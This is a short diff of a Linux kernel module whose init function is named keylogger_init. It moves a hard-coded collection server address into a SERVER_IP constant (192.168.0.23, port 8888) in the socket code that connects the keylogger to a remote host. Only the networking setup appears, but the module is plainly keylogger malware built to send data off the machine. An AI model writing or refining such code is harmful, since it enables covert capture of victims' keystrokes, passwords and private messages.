@@ -7,6 +7,7 @@
 #include <linux/in.h>
 #include <linux/inet.h>
 
+#define SERVER_IP "192.168.0.23"
 #define SERVER_PORT 8888
 
 MODULE_LICENSE("GPL");
@@ -79,7 +80,7 @@ static int __init keylogger_init(void)
     // Set up the server address
     memset(&sin, 0, sizeof(struct sockaddr_in));
     sin.sin_family = AF_INET;
-    sin.sin_addr.s_addr = in_aton("192.168.0.112");
+    sin.sin_addr.s_addr = in_aton(SERVER_IP);
     sin.sin_port = htons(SERVER_PORT);
 
     // Connect the socket to the server
